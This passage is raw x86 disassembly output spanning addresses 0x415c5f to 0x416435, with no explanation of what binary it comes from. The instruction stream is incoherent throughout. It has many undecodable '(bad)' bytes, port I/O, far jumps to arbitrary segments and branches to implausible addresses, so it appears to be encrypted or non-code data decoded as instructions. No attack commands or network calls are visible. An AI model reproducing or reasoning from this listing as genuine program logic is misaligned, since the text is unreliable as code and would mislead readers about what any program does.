  415c5f:	mov    al,0x94
  415c61:	pusha  
  415c62:	sbb    ah,ch
  415c64:	pop    ds
  415c65:	mov    ch,0xfd
  415c67:	xor    DWORD PTR [edx-0x1b],0x3
  415c6b:	mov    ecx,0xa9aa7c68
  415c70:	dec    esp
  415c71:	aas    
  415c72:	std    
  415c73:	jns    0x415c09
  415c75:	mov    edi,0x4572f77a
  415c7a:	xchg   edi,eax
  415c7b:	cwde   
  415c7c:	adc    eax,0xc2941d44
  415c81:	lock cmc 
  415c83:	mov    dh,BYTE PTR [edi]
  415c85:	sar    BYTE PTR [edi-0x1e],0x9a
  415c89:	dec    ebp
  415c8a:	mov    al,ds:0x79e0dca6
  415c8f:	add    edi,ecx
  415c91:	cmp    BYTE PTR [eax-0x3d],dh
  415c94:	cmp    bh,BYTE PTR [edx]
  415c96:	fninit 
  415c98:	mov    ch,0x3d
  415c9a:	rol    bl,cl
  415c9c:	and    eax,0x78a3a3a6
  415ca1:	dec    edx
  415ca2:	cmp    eax,DWORD PTR [eax+0x2b74fee2]
  415ca8:	mov    esi,0x2237e7e5
  415cad:	jle    0x415c62
  415caf:	jmp    0xba3ef4a8
  415cb4:	sbb    DWORD PTR [eax],edx
  415cb6:	fwait
  415cb7:	cmp    eax,0x4687b0e8
  415cbc:	xchg   bh,dl
  415cbe:	inc    edx
  415cbf:	add    BYTE PTR [edx+0x17],ah
  415cc2:	out    0x59,al
  415cc4:	stos   DWORD PTR es:[edi],eax
  415cc5:	bound  ebx,QWORD PTR [ebp-0x32de69ae]
  415ccb:	pop    edx
  415ccc:	add    dh,ah
  415cce:	pop    ebx
  415ccf:	loop   0x415d1d
  415cd1:	mov    al,ds:0xb198e413
  415cd6:	out    dx,eax
  415cd7:	dec    eax
  415cd8:	test   BYTE PTR [ecx-0x1eb675b4],0xc1
  415cdf:	shr    BYTE PTR [esi+0x4],cl
  415ce2:	xchg   edi,eax
  415ce3:	cwde   
  415ce4:	jno    0x415ce1
  415ce6:	xchg   esp,eax
  415ce7:	test   ebx,0xd48a98a3
  415ced:	ja     0x415d2a
  415cef:	ret    
  415cf0:	stos   BYTE PTR es:[edi],al
  415cf1:	xchg   DWORD PTR [eax-0x24caa034],esi
  415cf7:	or     dl,0xba
  415cfa:	ror    BYTE PTR [edx],1
  415cfc:	sbb    esp,DWORD PTR [ebx-0x44]
  415cff:	mov    bh,0xd9
  415d01:	loopne 0x415cc2
  415d03:	pop    esi
  415d04:	(bad)  
  415d05:	dec    edx
  415d06:	sub    DWORD PTR [ecx-0x364a8197],esp
  415d0c:	aad    0x65
  415d0e:	and    DWORD PTR [esi+edi*2+0x6a],edi
  415d12:	mov    ebx,0xebd0a90f
  415d17:	imul   ecx,DWORD PTR [esi],0xffffffd2
  415d1a:	(bad)  
  415d1b:	ins    BYTE PTR es:[edi],dx
  415d1c:	loopne 0x415d99
  415d1e:	dec    esi
  415d1f:	push   eax
  415d20:	inc    eax
  415d21:	in     eax,dx
  415d22:	fld    TBYTE PTR [esp+edx*2-0x406832a3]
  415d29:	dec    esp
  415d2a:	inc    ebp
  415d2b:	(bad)  
  415d2d:	arpl   WORD PTR [ebx],cx
  415d2f:	mov    eax,0xfcaa4208
  415d34:	lahf   
  415d35:	sbb    eax,DWORD PTR ds:0x14d3c815
  415d3b:	add    al,0xed
  415d3d:	imul   eax,DWORD PTR [edi+0x65],0x830081d8
  415d44:	std    
  415d45:	ins    DWORD PTR es:[edi],dx
  415d46:	lock mov ebp,esp
  415d49:	fisttp WORD PTR [edi+eiz*1+0x5f099f25]
  415d50:	jp     0x415d56
  415d52:	leave  
  415d53:	push   0x27
  415d55:	das    
  415d56:	lds    esi,FWORD PTR ds:0xaf6a0c9d
  415d5c:	jle    0x415d6b
  415d5e:	inc    edx
  415d5f:	push   edi
  415d60:	loopne 0x415d8f
  415d62:	mov    eax,0xd508e25
  415d67:	sub    eax,0x19dafa93
  415d6c:	cmc    
  415d6d:	cmp    BYTE PTR [ebx+edi*2+0x6b],al
  415d71:	lea    ebp,[eax-0x72b17134]
  415d77:	mov    ecx,0x892c505e
  415d7c:	jecxz  0x415de9
  415d7e:	frstor [ebx]
  415d80:	sub    BYTE PTR [eax+0x1d],bh
  415d83:	add    DWORD PTR [edi-0x2bfac87e],edx
  415d89:	ins    BYTE PTR es:[edi],dx
  415d8a:	pop    edx
  415d8b:	in     al,dx
  415d8c:	pop    ds
  415d8d:	ins    DWORD PTR es:[edi],dx
  415d8e:	test   eax,0xa43e1f14
  415d93:	xchg   ecx,eax
  415d94:	xchg   edi,eax
  415d95:	jl     0x415e04
  415d97:	ins    DWORD PTR es:[edi],dx
  415d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d99:	arpl   cx,ax
  415d9b:	add    DWORD PTR [esi+edi*8-0x4e],esp
  415d9f:	stos   BYTE PTR es:[edi],al
  415da0:	sahf   
  415da1:	mov    ecx,0x33552ed2
  415da6:	icebp  
  415da7:	loope  0x415da7
  415da9:	dec    edi
  415daa:	dec    eax
  415dab:	sbb    BYTE PTR [edi+0x4f4eb5db],ch
  415db1:	leave  
  415db2:	adc    DWORD PTR [esi+0x34],esi
  415db5:	xlat   BYTE PTR ds:[ebx]
  415db6:	sub    al,0xce
  415db8:	push   edi
  415db9:	and    DWORD PTR [edx-0x6da91b97],esi
  415dbf:	jg     0x415d54
  415dc1:	pcmpgtw mm6,QWORD PTR [ebx]
  415dc4:	dec    esp
  415dc5:	idiv   DWORD PTR [edi-0x1e]
  415dc8:	test   DWORD PTR [esi],esi
  415dca:	addr16 push eax
  415dcc:	ret    0x7e07
  415dcf:	xchg   ebp,eax
  415dd0:	hlt    
  415dd1:	pop    ebp
  415dd2:	add    eax,DWORD PTR [ecx+0x7b]
  415dd5:	xor    dh,bh
  415dd7:	adc    eax,0xd769650a
  415ddc:	inc    edx
  415ddd:	jbe    0x415dd4
  415ddf:	add    dh,BYTE PTR [ebp+0x9b75c99]
  415de5:	mov    al,0x14
  415de7:	(bad)  
  415de8:	push   eax
  415de9:	pop    ecx
  415dea:	mov    bl,BYTE PTR ds:[eax]
  415ded:	imul   edx,DWORD PTR [edi+0x44db4dbd],0x3d
  415df4:	mov    ecx,0xa17352d9
  415df9:	and    BYTE PTR [edi+0x3c217b61],0x88
  415e00:	xchg   BYTE PTR [ebx+0x28c8e7f1],ch
  415e06:	test   eax,0x17910f47
  415e0b:	sub    DWORD PTR [edx-0xf],0x4964c687
  415e12:	xor    ah,ah
  415e14:	adc    al,0x64
  415e16:	jg     0x415e39
  415e18:	jle    0x415e27
  415e1a:	dec    esi
  415e1b:	sub    eax,0x3846f9d2
  415e20:	inc    edx
  415e21:	sbb    al,0x57
  415e23:	pop    edx
  415e24:	jne    0x415e0f
  415e26:	(bad)  
  415e27:	aad    0xda
  415e29:	out    dx,eax
  415e2a:	aam    0xf9
  415e2c:	push   0x75
  415e2e:	arpl   WORD PTR [edx-0x4],bp
  415e31:	stos   BYTE PTR es:[edi],al
  415e32:	sbb    edi,ecx
  415e34:	cmp    eax,0x1cf60241
  415e3a:	arpl   WORD PTR [edi-0x2409fe4a],ax
  415e40:	bound  eax,QWORD PTR [ecx]
  415e42:	sub    al,0xd1
  415e44:	and    DWORD PTR [edx],esp
  415e46:	repnz mov cl,0xa7
  415e49:	push   es
  415e4a:	ins    DWORD PTR es:[edi],dx
  415e4b:	add    al,0xbb
  415e4d:	or     eax,DWORD PTR [edi]
  415e4f:	jno    0x415e89
  415e51:	(bad)  
  415e53:	dec    edx
  415e54:	stc    
  415e55:	add    cl,BYTE PTR [ebp-0x33]
  415e58:	mov    ebp,0x30c1f110
  415e5d:	or     BYTE PTR [ecx],dh
  415e5f:	mov    al,0xa8
  415e61:	add    dl,0xdd
  415e64:	xlat   BYTE PTR ds:[ebx]
  415e65:	arpl   WORD PTR [ecx],bp
  415e67:	mov    es,WORD PTR [ecx+0x7c5b7e7c]
  415e6d:	stos   DWORD PTR es:[edi],eax
  415e6e:	aam    0x30
  415e70:	pop    esp
  415e71:	xchg   esp,eax
  415e72:	ja     0x415df7
  415e74:	sub    DWORD PTR ds:0x3528bdd5,esp
  415e7a:	out    0x90,eax
  415e7c:	inc    ebx
  415e7d:	pop    edx
  415e7e:	lea    ebx,[edx]
  415e80:	pop    ebp
  415e81:	sub    eax,0xc433d52b
  415e86:	fs dec ebx
  415e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e89:	sub    dl,dl
  415e8b:	ret    0x9ea3
  415e8e:	dec    ecx
  415e8f:	mov    al,ds:0x115d9bac
  415e94:	lahf   
  415e95:	dec    edx
  415e96:	inc    ebp
  415e97:	loop   0x415f10
  415e99:	scas   al,BYTE PTR es:[edi]
  415e9a:	in     al,dx
  415e9b:	mov    ch,0x26
  415e9d:	dec    edx
  415e9e:	dec    esp
  415e9f:	xor    al,0xc0
  415ea1:	test   al,0x43
  415ea3:	add    DWORD PTR [ebx+0x732c9c25],0x1925e07b
  415ead:	and    DWORD PTR [ebp-0x5e927247],0x27
  415eb4:	xchg   ebp,eax
  415eb5:	inc    eax
  415eb6:	pop    esp
  415eb7:	outs   dx,DWORD PTR ds:[esi]
  415eb8:	xor    DWORD PTR [ecx-0x34581a96],edi
  415ebe:	sbb    al,0x38
  415ec0:	add    eax,0xa9300e87
  415ec5:	inc    esi
  415ec6:	pop    edx
  415ec7:	dec    edi
  415ec8:	mov    edx,0x6ad9fb7c
  415ecd:	shl    esp,1
  415ecf:	test   eax,0xfd07cf27
  415ed4:	jns    0x415ea2
  415ed6:	test   DWORD PTR [edx+0x38],ebx
  415ed9:	pop    ds
  415eda:	dec    esp
  415edb:	mov    ebx,DWORD PTR [esi]
  415edd:	daa    
  415ede:	inc    esp
  415edf:	mul    al
  415ee1:	jg     0x415ef5
  415ee3:	loopne 0x415e98
  415ee5:	ds pop eax
  415ee7:	jb     0x415eb3
  415ee9:	ret    
  415eea:	fiadd  DWORD PTR [edi+0x3bbeefee]
  415ef0:	mov    esp,0x7a0126a6
  415ef5:	cmp    edi,DWORD PTR [esi+0x6271f687]
  415efb:	neg    BYTE PTR [eax+0x72a163d5]
  415f01:	add    al,BYTE PTR [ecx-0x25]
  415f04:	ret    0x1a91
  415f07:	out    dx,al
  415f08:	(bad)  
  415f09:	not    BYTE PTR [eax+0x17a83476]
  415f0f:	xchg   edi,eax
  415f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f11:	in     al,0x8d
  415f13:	and    DWORD PTR [ecx-0x22bda479],esp
  415f19:	xor    eax,0xd2dc0292
  415f1e:	sar    DWORD PTR [esi-0xdd6c820],0x36
  415f25:	inc    ebp
  415f26:	and    eax,0x1d4883c5
  415f2b:	and    al,0xfe
  415f2d:	dec    edi
  415f2e:	cmp    eax,0x92bf9cfa
  415f33:	shr    BYTE PTR [eax-0x3d2156ac],cl
  415f39:	lods   al,BYTE PTR ds:[esi]
  415f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f3c:	scas   eax,DWORD PTR es:[edi]
  415f3d:	and    ebp,DWORD PTR [eax-0x3f33d483]
  415f43:	int3   
  415f44:	adc    edi,edx
  415f46:	(bad)  
  415f47:	or     ah,ah
  415f49:	jle    0x415f23
  415f4b:	and    bh,bh
  415f4d:	(bad)  
  415f4e:	xchg   ah,dl
  415f50:	cs ret 0x9454
  415f54:	pop    esi
  415f55:	pushf  
  415f56:	(bad)  
  415f57:	test   dh,0x52
  415f5a:	jmp    0x8ef5:0x1192637c
  415f61:	sbb    cl,bl
  415f63:	push   eax
  415f64:	pop    edx
  415f65:	jg     0x415fc0
  415f67:	into   
  415f68:	icebp  
  415f69:	and    DWORD PTR [esi],ebp
  415f6b:	(bad)  
  415f6c:	jne    0x415f01
  415f6e:	imul   BYTE PTR [esi+ebp*4+0x7c]
  415f72:	sbb    ah,BYTE PTR [ecx+0x13]
  415f75:	push   0xffffff8a
  415f77:	or     DWORD PTR [ecx],ebp
  415f79:	mov    ebx,0xaae09174
  415f7e:	jae    0x415fa3
  415f80:	or     edx,0xffffffdc
  415f83:	int3   
  415f84:	nop
  415f85:	jnp    0x415f3c
  415f87:	xchg   edx,eax
  415f88:	and    dh,0x9d
  415f8b:	sbb    eax,0xf6ef2ee6
  415f90:	clc    
  415f91:	jp     0x415fbf
  415f93:	push   ebp
  415f94:	addr16 inc ebp
  415f96:	sub    BYTE PTR [ebp-0x5],ch
  415f99:	pop    ds
  415f9a:	repz mov ebx,0xff2f9bc4
  415fa0:	test   al,0x64
  415fa2:	xchg   edi,eax
  415fa3:	mov    ch,0x61
  415fa5:	icebp  
  415fa6:	mov    ebx,DWORD PTR [ecx-0x22b23b4c]
  415fac:	adc    eax,0x1619314d
  415fb1:	add    DWORD PTR [esi-0x67],esp
  415fb4:	bound  ebp,QWORD PTR [ebx-0x5ba2616d]
  415fba:	mov    dl,0x71
  415fbc:	mov    al,ds:0x316d7a56
  415fc1:	sti    
  415fc2:	pushf  
  415fc3:	ror    BYTE PTR [eax+0x280b1fb5],1
  415fc9:	retf   0xaa1a
  415fcc:	fcomp  DWORD PTR [eax+ebp*8+0x3b]
  415fd0:	jmp    0x2ca25450
  415fd5:	inc    edx
  415fd6:	ret    0x9b99
  415fd9:	nop
  415fda:	push   ss
  415fdb:	enter  0x749b,0xf4
  415fdf:	inc    DWORD PTR [esi-0x60a3c56]
  415fe5:	sub    al,BYTE PTR [edx]
  415fe7:	xchg   BYTE PTR [edi-0x7],cl
  415fea:	mov    ah,0x4a
  415fec:	add    dh,BYTE PTR [ebp+0xdc7794]
  415ff2:	push   es
  415ff3:	xor    ebp,edx
  415ff5:	in     eax,dx
  415ff6:	aad    0xb4
  415ff8:	mov    edx,edi
  415ffa:	or     eax,0x85d6145a
  416000:	stos   BYTE PTR es:[edi],al
  416001:	retf   
  416002:	stos   DWORD PTR es:[edi],eax
  416003:	sub    eax,0x451ba217
  416008:	mov    esi,0xf8d775b
  41600d:	nop
  41600e:	imul   ebp,DWORD PTR ds:0x83d6c2be,0xc4c2e1b
  416018:	out    0xde,eax
  41601a:	maskmovq mm4,(bad)
  41601b:	mul    DWORD PTR [ecx+ecx*8]
  41601e:	jne    0x415fd8
  416020:	pop    edi
  416021:	sub    eax,0x732d42b9
  416026:	xchg   ecx,eax
  416027:	or     eax,0x90f706aa
  41602c:	mov    DWORD PTR [eax+0x0],edi
  41602f:	mov    bl,BYTE PTR [esi-0xc]
  416032:	cmp    cl,BYTE PTR [esi+0x3d019005]
  416038:	out    0xca,eax
  41603a:	in     eax,dx
  41603b:	ja     0x41600d
  41603d:	pop    edx
  41603e:	mov    esp,0xd69ada96
  416043:	jecxz  0x4160b7
  416045:	xor    bh,BYTE PTR [eax+eax*2-0x23]
  416049:	xor    ebx,DWORD PTR [eax+edi*8+0x77]
  41604d:	arpl   di,ax
  41604f:	push   ebp
  416050:	fmul   st,st(2)
  416052:	adc    DWORD PTR [esi+0x79],edi
  416055:	adc    eax,DWORD PTR [edi]
  416057:	enter  0x2bd,0x7f
  41605b:	and    dl,bl
  41605d:	aas    
  41605e:	jae    0x415ff0
  416060:	lds    edx,FWORD PTR [ebp+esi*1+0x51]
  416064:	sub    eax,0xc6572a1a
  41606a:	jns    0x416010
  41606c:	inc    eax
  41606d:	fstp   TBYTE PTR [eax+0x2d]
  416070:	ins    DWORD PTR es:[edi],dx
  416071:	cmp    eax,edi
  416073:	aad    0xc6
  416075:	int3   
  416076:	sub    ebx,0x67b8c4b3
  41607c:	fld    DWORD PTR [esi+0x35]
  41607f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416080:	adc    esp,DWORD PTR [ebx]
  416082:	pusha  
  416083:	retf   
  416084:	mov    ds:0x99f36ac0,eax
  416089:	ret    
  41608a:	shl    DWORD PTR [edx],cl
  41608c:	xor    DWORD PTR [eax-0x6437672e],0x30
  416093:	int3   
  416094:	ret    0xb6d2
  416097:	ret    
  416098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416099:	int3   
  41609a:	daa    
  41609b:	popf   
  41609c:	out    0xcf,al
  41609e:	scas   al,BYTE PTR es:[edi]
  41609f:	inc    ecx
  4160a0:	aam    0x10
  4160a2:	addr16 out 0x22,al
  4160a5:	mov    WORD PTR [eax],cs
  4160a7:	jns    0x4160c6
  4160a9:	pop    ebp
  4160aa:	fdivp  st(2),st
  4160ac:	into   
  4160ad:	ins    DWORD PTR es:[edi],dx
  4160ae:	jg     0x4160fa
  4160b0:	ret    
  4160b1:	push   cs
  4160b2:	shr    DWORD PTR [ebx-0x3f75f9ea],0x56
  4160b9:	ss scas eax,DWORD PTR es:[edi]
  4160bb:	stos   BYTE PTR es:[edi],al
  4160bc:	cmp    DWORD PTR [ebx],0x6e
  4160bf:	pop    ebp
  4160c0:	fisub  DWORD PTR [ecx+eax*2]
  4160c3:	jmp    0x500565a2
  4160c8:	inc    ecx
  4160c9:	rcl    BYTE PTR ds:0x9f2e44eb,1
  4160cf:	addr16 cmp eax,ecx
  4160d2:	sbb    ch,BYTE PTR ds:0x5bbd97b5
  4160d8:	arpl   WORD PTR [esi+0x1f1bf705],bp
  4160de:	shl    esi,1
  4160e0:	mov    bl,0x70
  4160e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160e4:	add    al,0x3b
  4160e6:	jae    0x41614a
  4160e8:	push   eax
  4160e9:	outs   dx,DWORD PTR ds:[esi]
  4160ea:	cmc    
  4160eb:	push   edx
  4160ec:	retf   
  4160ed:	bound  ebx,QWORD PTR [edx+eiz*4-0x1bf946e1]
  4160f4:	push   ss
  4160f5:	xchg   edi,eax
  4160f6:	imul   ecx,DWORD PTR [eax+0x2e],0x683bad9d
  4160fd:	inc    ecx
  4160fe:	or     DWORD PTR [edx-0x1a806af4],esi
  416104:	mov    bh,0xf5
  416106:	xlat   BYTE PTR ds:[ebx]
  416107:	fsubr  QWORD PTR [edi]
  416109:	fs ret 
  41610b:	push   ds
  41610c:	mov    ebx,0x80c1f23
  416111:	fcom   st(2)
  416113:	add    al,0x48
  416115:	sbb    edx,DWORD PTR [esi]
  416117:	jbe    0x416162
  416119:	lock jns 0x416158
  41611c:	dec    eax
  41611d:	repz cmp bh,ch
  416120:	inc    edx
  416121:	jmp    0x2860f152
  416126:	repnz aas 
  416128:	lods   eax,DWORD PTR ds:[esi]
  416129:	nop
  41612a:	loopne 0x416119
  41612c:	dec    edi
  41612d:	ror    BYTE PTR [eax-0x53],1
  416130:	fdivr  QWORD PTR [edi]
  416132:	mov    cl,0xab
  416134:	mov    ds:0x233271b6,eax
  416139:	imul   esi,DWORD PTR [edi],0xca1f396e
  41613f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416140:	rcl    BYTE PTR [edi+0x36f469f],0x22
  416147:	mov    dl,0xec
  416149:	pushf  
  41614a:	inc    ebx
  41614b:	mov    esi,0x53bf9f73
  416150:	sub    DWORD PTR [edi+0x67],0x62f42038
  416157:	jmp    0x61a2:0xd04a4ac6
  41615e:	in     eax,dx
  41615f:	xchg   bh,ch
  416161:	movsx  edi,BYTE PTR [esi+0x4edde3d1]
  416168:	sub    eax,0xf7755090
  41616d:	fcmovne st,st(3)
  41616f:	(bad)  
  416170:	nop
  416171:	dec    esi
  416172:	mov    ch,0x90
  416174:	test   al,0xfb
  416176:	nop
  416177:	push   cs
  416178:	lea    ecx,cs:[edi-0x126be3c0]
  41617f:	inc    edx
  416180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416181:	jge    0x416103
  416183:	retw   0x6c22
  416187:	push   eax
  416188:	adc    BYTE PTR [edx],dl
  41618a:	push   0xffffff83
  41618c:	out    0x29,eax
  41618e:	add    BYTE PTR gs:[esi+0x3df3306a],bl
  416195:	or     al,0x7b
  416197:	or     DWORD PTR [ecx-0x24],edi
  41619a:	loop   0x416161
  41619c:	test   BYTE PTR [ebp-0x35f92bab],0xc
  4161a3:	inc    esp
  4161a4:	jg     0x41616b
  4161a6:	push   0x46d2f17
  4161ab:	xor    bl,BYTE PTR [esi*1-0x5b216c7b]
  4161b2:	sub    BYTE PTR [esi+0x41],bl
  4161b5:	xlat   BYTE PTR ds:[ebx]
  4161b6:	rcl    DWORD PTR [ecx+ebx*8-0x75],1
  4161ba:	or     al,0x65
  4161bc:	clc    
  4161bd:	adc    ch,cl
  4161bf:	add    dl,dh
  4161c1:	mov    ah,0x98
  4161c3:	imul   esi
  4161c5:	add    BYTE PTR [edx-0xa7a108b],ch
  4161cb:	push   cs
  4161cc:	stc    
  4161cd:	out    dx,al
  4161ce:	jle    0x4161e7
  4161d0:	cdq    
  4161d1:	lds    esp,FWORD PTR [ecx+ecx*1]
  4161d4:	mov    esi,0x4ffbe48
  4161d9:	in     eax,0x60
  4161db:	imul   edx,ebx,0x38
  4161de:	sub    DWORD PTR [ecx],esi
  4161e0:	daa    
  4161e1:	jl     0x416196
  4161e3:	xchg   esi,eax
  4161e4:	(bad)  
  4161e5:	loope  0x416226
  4161e7:	out    0x8,al
  4161e9:	pop    ds
  4161ea:	stos   BYTE PTR es:[edi],al
  4161eb:	call   0xeeacfb9e
  4161f0:	stc    
  4161f1:	(bad)  
  4161f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161f3:	enter  0x2f5b,0x82
  4161f7:	outs   dx,BYTE PTR ds:[esi]
  4161f8:	mov    ebx,0xcf10ed8b
  4161fd:	xchg   edx,eax
  4161fe:	sub    eax,0xe2defa5e
  416203:	dec    edi
  416204:	and    al,BYTE PTR [ebx+0x747787c3]
  41620a:	dec    edx
  41620b:	int3   
  41620c:	jle    0x416274
  41620e:	inc    esp
  41620f:	stos   BYTE PTR es:[edi],al
  416210:	retf   0x9458
  416213:	mov    esi,0xf6db9b3a
  416218:	adc    al,0x9a
  41621a:	loope  0x41625c
  41621c:	sbb    DWORD PTR [edi+edi*2],ebp
  41621f:	cmp    cl,BYTE PTR [bx-0x39]
  416223:	fs jns 0x4161b6
  416226:	cmp    al,0x5
  416228:	pop    edi
  416229:	push   cs
  41622a:	sub    DWORD PTR [edi],ebp
  41622c:	mov    dl,0xfd
  41622e:	out    0xbb,eax
  416230:	push   esi
  416231:	xchg   esp,eax
  416232:	test   eax,0x85df3e2d
  416237:	div    esp
  416239:	repz ret 
  41623b:	sub    al,0x9c
  41623d:	test   ah,cl
  41623f:	jb     0x4162b9
  416241:	push   edi
  416242:	mov    ecx,0x4366f27c
  416247:	ret    
  416248:	mov    bh,0x84
  41624a:	or     ah,cl
  41624c:	jae    0x41627e
  41624e:	xor    DWORD PTR [edx],ecx
  416250:	pop    ebp
  416251:	and    esi,esp
  416253:	push   ecx
  416254:	adc    BYTE PTR [eax-0x68],ch
  416257:	(bad)  
  416258:	lahf   
  416259:	bound  eax,QWORD PTR [ebx+eiz*8]
  41625c:	cmc    
  41625d:	ja     0x41626a
  41625f:	xchg   esp,eax
  416260:	fld    DWORD PTR [eax+0x71]
  416263:	push   eax
  416264:	lock pop esi
  416266:	mov    ecx,0xa3f69c05
  41626b:	jnp    0x416285
  41626d:	enter  0x1ced,0xc2
  416271:	mov    al,ds:0x96918fca
  416276:	repnz hlt 
  416278:	sub    eax,0x163ff844
  41627d:	sbb    BYTE PTR [edx-0xd],dh
  416280:	mov    eax,ds:0xf56676f4
  416285:	mov    dl,0xd4
  416287:	sti    
  416288:	jge    0x4162bd
  41628a:	lahf   
  41628b:	mov    edi,0x8edb659a
  416290:	inc    esp
  416291:	mov    dl,0xa5
  416293:	gs gs dec esp
  416296:	nop
  416297:	push   esp
  416298:	mov    eax,ds:0xe5c6277a
  41629d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41629e:	cmp    al,0x71
  4162a0:	int3   
  4162a1:	pop    edi
  4162a2:	div    DWORD PTR ds:0x490517b
  4162a8:	or     ah,dl
  4162aa:	loopne 0x41623a
  4162ac:	fs xchg ebp,eax
  4162ae:	inc    eax
  4162af:	jbe    0x41632a
  4162b1:	int    0xa1
  4162b3:	dec    esi
  4162b4:	mov    eax,DWORD PTR [eax+0x2039708c]
  4162ba:	mov    eax,0x16aa095b
  4162bf:	inc    ebx
  4162c0:	add    BYTE PTR ds:0x87da0ac4,0xe5
  4162c7:	jae    0x41627d
  4162c9:	out    dx,eax
  4162ca:	cwde   
  4162cb:	and    DWORD PTR [ecx-0x5c],edx
  4162ce:	aaa    
  4162cf:	ja     0x41628e
  4162d1:	mov    al,ds:0x71220128
  4162d6:	mov    ds:0x2619fa68,al
  4162db:	cwde   
  4162dc:	call   0x1bb7:0x879e87ff
  4162e3:	sbb    esi,DWORD PTR [esi+0x5e41d12c]
  4162e9:	ret    0x48d9
  4162ec:	cmp    dh,ch
  4162ee:	jnp    0x416353
  4162f0:	fadd   QWORD PTR [edx]
  4162f2:	rcl    al,cl
  4162f4:	out    0xee,al
  4162f6:	ret    
  4162f7:	push   ecx
  4162f8:	jge    0x416357
  4162fa:	ror    ebx,1
  4162fc:	push   ss
  4162fd:	ret    0xff91
  416300:	fdivr  QWORD PTR [ebp-0x5a1f064b]
  416306:	mov    esi,0xa43ff9c1
  41630b:	(bad)  
  41630c:	jg     0x41629e
  41630e:	(bad)  
  41630f:	mov    edx,0xa13db209
  416314:	in     eax,dx
  416315:	ins    BYTE PTR es:[edi],dx
  416316:	stos   DWORD PTR es:[edi],eax
  416317:	jo     0xe76f07c2
  41631d:	pop    esp
  41631e:	add    bh,BYTE PTR [esi]
  416320:	add    al,ah
  416322:	jbe    0x416382
  416324:	jge    0x416362
  416326:	repz pop ebx
  416328:	inc    esp
  416329:	adc    BYTE PTR [ebp+0xf],bl
  41632c:	(bad)  
  41632e:	or     al,0x16
  416330:	pop    eax
  416331:	mov    ebp,0xd62b3517
  416336:	inc    edx
  416337:	inc    edx
  416338:	les    ebp,FWORD PTR [esi-0x15]
  41633b:	jg     0x4162be
  41633d:	dec    edi
  41633e:	aad    0xac
  416340:	pop    edi
  416341:	loop   0x41637e
  416343:	pop    ebx
  416344:	mov    bl,0x7d
  416346:	(bad)  
  416347:	mov    ch,0x7
  416349:	(bad)  
  41634a:	in     al,0x44
  41634c:	push   ds
  41634d:	fbstp  TBYTE PTR [esi+0x3]
  416350:	fcmovnu st,st(6)
  416352:	dec    eax
  416353:	lds    ebp,FWORD PTR [ecx+0x408aff5]
  416359:	aas    
  41635a:	(bad)  
  41635b:	rcl    BYTE PTR [edi-0x44],cl
  41635e:	sub    eax,0x31b17273
  416363:	std    
  416364:	or     ebp,DWORD PTR [esi-0xe864ac5]
  41636a:	int    0xc8
  41636c:	stos   DWORD PTR es:[edi],eax
  41636d:	call   0x82fc4831
  416372:	cmp    BYTE PTR [ecx+0x73],0x97
  416376:	cmc    
  416377:	dec    esi
  416378:	and    eax,0xb2f7b1d3
  41637d:	aad    0x5d
  41637f:	adc    ecx,DWORD PTR [ebx+0x5a13070c]
  416385:	add    esp,DWORD PTR [edi-0x51a1e2fa]
  41638b:	push   ss
  41638c:	shl    cl,1
  41638e:	xor    al,0x4
  416390:	jmp    0x416399
  416392:	xchg   ebp,eax
  416393:	pop    edx
  416394:	push   esi
  416395:	sbb    edx,DWORD PTR [eax+edx*4]
  416398:	cli    
  416399:	push   ecx
  41639a:	pop    ecx
  41639b:	pop    esp
  41639c:	pushf  
  41639d:	xor    eax,0xe48002de
  4163a2:	add    BYTE PTR [edx+ebx*8],dh
  4163a5:	cmp    esp,DWORD PTR [esi+0x5f48e228]
  4163ab:	lahf   
  4163ac:	cmp    ebx,DWORD PTR [eax+0xe]
  4163af:	ins    BYTE PTR es:[edi],dx
  4163b0:	fwait
  4163b1:	mov    ebp,0x5ed9971b
  4163b6:	pop    esp
  4163b7:	(bad)  
  4163b8:	rcr    ah,0xff
  4163bb:	mov    ebx,0x22ee0a05
  4163c0:	xor    ah,BYTE PTR [ecx-0x11]
  4163c3:	loopne 0x4163ff
  4163c5:	(bad)  
  4163c7:	or     al,0xea
  4163c9:	mov    DWORD PTR [ebp+0x3],0xe7bc8e21
  4163d0:	neg    DWORD PTR [ebp+0x3ed422ab]
  4163d6:	sbb    DWORD PTR [edi+esi*4],edi
  4163d9:	xor    BYTE PTR [edi-0x5e270c17],ah
  4163df:	sub    DWORD PTR [esi],0xffffffd2
  4163e2:	je     0x416384
  4163e4:	pop    ds
  4163e5:	out    0x1f,al
  4163e7:	loop   0x41641f
  4163e9:	adc    DWORD PTR [esi+0x5fcc1f7e],ebp
  4163ef:	stos   BYTE PTR es:[edi],al
  4163f0:	pop    ebx
  4163f1:	dec    edx
  4163f2:	in     eax,0x8a
  4163f4:	mov    esp,0x3ba34e2b
  4163f9:	push   ds
  4163fa:	cdq    
  4163fb:	xor    dl,BYTE PTR ds:0x2b8efb53
  416401:	mov    bl,0x9
  416403:	lds    ebp,FWORD PTR [edx-0x69d47ad]
  416409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41640a:	sti    
  41640b:	icebp  
  41640c:	stc    
  41640d:	retf   0x60ea
  416410:	dec    ecx
  416411:	les    esp,FWORD PTR [eax+0x7e]
  416414:	call   0x96d9dc7c
  416419:	jnp    0x416435
  41641b:	inc    ecx
  41641c:	inc    ecx
  41641d:	pushf  
  41641e:	rcl    DWORD PTR [edi],1
  416420:	jp     0x41643d
  416422:	rol    BYTE PTR [ebx+0xf],1
  416425:	pminsw mm1,QWORD PTR [esi]
  416428:	jbe    0x416436
  41642a:	jmp    0x457d:0x8445fb9
  416431:	stos   DWORD PTR es:[edi],eax
  416432:	push   0xffffffc2
  416434:	scas   eax,DWORD PTR es:[edi]
  416435:	jle    0x4164ad
